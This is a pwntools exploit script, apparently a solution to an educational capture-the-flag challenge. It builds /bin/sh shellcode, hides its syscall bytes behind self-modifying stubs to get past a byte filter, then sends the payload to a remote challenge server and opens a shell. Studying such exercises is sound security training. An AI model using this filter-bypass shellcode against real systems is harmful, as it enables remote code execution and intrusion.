from pwn import *

context.arch = 'amd64'

sh_sc = asm(shellcraft.sh())
# find offset of 0x05, 0x0f in sh_sc
offsets = [sh_sc.find(b'\x05'), sh_sc.find(b'\x0f')]
print("0x05 offset:", sh_sc.find(b'\x05'))
print("0x0f offset:", sh_sc.find(b'\x0f'))

sc_0f = asm(f'''
    mov al, 0x10
    dec al
    mov byte ptr [r8], al
''')

sc_05 = asm(f'''
    mov al, 0x06
    dec al
    mov byte ptr [r8], al
''')

sc_2 = asm(f'''
    call 1f
    1: pop r8
    add r8, {len(sc_0f) + 6 + offsets[1]}
''') # point r8 to sh_sc[offsets[1]]

sc_1 = asm(f'''
    call 1f
    1: pop r8
    add r8, {len(sc_05) + len(sc_2) + len(sc_0f) + 6 + offsets[0]}
''') # point r8 to sh_sc[offsets[0]]

all_sc = sc_1 + sc_05 + sc_2 + sc_0f + sh_sc

print(all_sc.hex())

#io = process('./chal')
#pause() 
#io.send(all_sc)
#io.interactive()

conn = remote('edu-ctf.zoolab.org', 10201)
conn.send(all_sc)
conn.interactive()
